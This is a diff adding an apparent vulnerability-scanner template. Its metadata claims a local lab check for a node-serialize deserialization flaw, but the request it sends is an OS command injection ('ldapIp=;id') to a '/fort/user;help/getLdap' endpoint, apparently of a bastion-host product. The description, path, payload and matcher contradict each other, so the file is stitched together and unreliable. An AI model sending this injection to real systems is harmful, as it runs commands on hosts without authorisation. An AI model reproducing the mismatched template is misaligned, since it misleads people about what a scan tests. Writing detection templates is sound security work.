@@ -1,0 +1,25 @@
+id: shenxinfu
+
+info:
+  name: node-serialize <= 0.0.4 - Local Lab Detection (no OAST)
+  author: kylew1004
+  severity: critical
+  description: |
+    Local lab check for node-serialize <= 0.0.4 at /api/deserialize.
+    It sends an IIFE payload and expects the lab app to return {"ok":true}.
+  tags: FORTSESSIONID
+
+http:
+  - raw:
+      - |
+        POST /fort/user;help/getLdap HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ldapIp=;id
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid'
+
